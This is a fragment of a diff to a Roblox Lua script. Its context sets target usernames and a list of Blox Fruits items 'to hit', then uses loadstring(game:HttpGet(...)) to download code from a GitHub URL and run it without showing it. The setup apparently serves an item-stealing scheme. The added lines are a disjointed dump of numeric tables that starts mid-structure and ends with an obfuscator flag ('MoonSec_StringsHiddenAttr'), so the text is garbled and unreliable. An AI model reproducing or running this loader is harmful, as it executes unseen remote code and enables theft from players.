@@ -3,3 +3,40 @@ Usernames = {"thenicebroim"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
+          [3] = 4,
+        },
+        [35] = {
+          [1] = 26,
+          [2] = 2,
+          [3] = 0,
+          [4] = 0,
+        },
+        [36] = {
+          [1] = 119,
+          [2] = 2,
+          [3] = 2,
+          [4] = 0,
+        },
+        [37] = {
+          [1] = 118,
+          [2] = 0,
+          [3] = 1,
+          [4] = 0,
+        },
+      },
+      [2] = {
+      },
+      [3] = 2,
+      [4] = {
+      },
+    },
+  },
+  [3] = 0,
+  [4] = {
+  },
+}
+[table]:{
+}
+[table]:{
+  "MoonSec_StringsHiddenAttr" = true,
+}
